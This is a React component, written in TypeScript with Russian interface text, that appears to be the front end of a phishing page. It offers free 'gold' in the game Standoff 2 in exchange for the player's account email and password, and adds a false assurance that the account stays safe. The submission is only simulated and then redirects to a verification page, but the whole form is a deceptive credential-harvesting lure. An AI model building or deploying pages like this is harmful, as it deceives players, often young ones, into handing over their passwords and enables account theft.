
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Lock, Mail, ShieldAlert } from "lucide-react";

const StandoffLoginForm = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Имитация отправки данных
    setTimeout(() => {
      setIsLoading(false);
      navigate("/verification");
    }, 1000);
  };

  return (
    <Card className="bg-black/30 backdrop-blur-sm border-purple-500/30 overflow-hidden">
      <CardHeader className="pb-3">
        <CardTitle className="text-xl text-center text-white">
          Введите данные вашего аккаунта
        </CardTitle>
        <CardDescription className="text-center text-gray-300">
          Для получения голды укажите данные входа в Standoff 2
        </CardDescription>
      </CardHeader>
      
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 h-4 w-4" />
              <Input
                type="email"
                placeholder="E-mail от аккаунта"
                className="pl-10 bg-black/20 border-purple-500/30 focus:border-purple-500 text-white"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>
          </div>
          
          <div className="space-y-2">
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 h-4 w-4" />
              <Input
                type="password"
                placeholder="Пароль от аккаунта"
                className="pl-10 bg-black/20 border-purple-500/30 focus:border-purple-500 text-white"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>
          </div>
          
          <div className="bg-yellow-900/20 border border-yellow-500/30 rounded p-3 flex items-start space-x-2">
            <ShieldAlert className="h-5 w-5 text-yellow-500 flex-shrink-0 mt-0.5" />
            <p className="text-sm text-yellow-200">
              Мы используем ваши данные только для зачисления голды. Ваш аккаунт в безопасности.
            </p>
          </div>
        </form>
      </CardContent>
      
      <CardFooter className="pt-0 pb-4">
        <Button 
          className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 transition-all"
          onClick={handleSubmit}
          disabled={isLoading}
        >
          {isLoading ? "Обработка..." : "Получить голду"}
        </Button>
      </CardFooter>
    </Card>
  );
};

export default StandoffLoginForm;
